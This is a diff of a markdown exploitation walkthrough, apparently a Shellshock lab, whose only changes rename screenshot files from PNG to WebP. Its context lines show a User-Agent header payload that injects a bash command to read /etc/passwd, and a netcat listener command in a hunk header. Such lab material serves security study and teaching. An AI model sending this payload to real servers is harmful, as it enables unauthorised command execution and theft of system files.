@@ -94,10 +94,10 @@ nc -lvnp 4444
 ## Manual Exploitation (Burp Suite)
 
 ### Step 1: Intercept Request
-![Burp Intercept](screenshots/burp-intercept.png)
+![Burp Intercept](screenshots/burp-intercept.webp)
 
 ### Step 2: Inject Payload
-![Exploitation](screenshots/exploitation.png)
+![Exploitation](screenshots/screenshot2.webp)
 
 Modify the User-Agent header:
 ```http
@@ -105,7 +105,7 @@ User-Agent: () { :;}; echo; /bin/bash -c 'cat /etc/passwd'
 ```
 
 ### Step 3: Observe Response
-![Reverse Shell](screenshots/reverse-shell.png)
+![Reverse Shell](screenshots/screenshot3.webp)
 
 The server executes your command and returns the output.
 
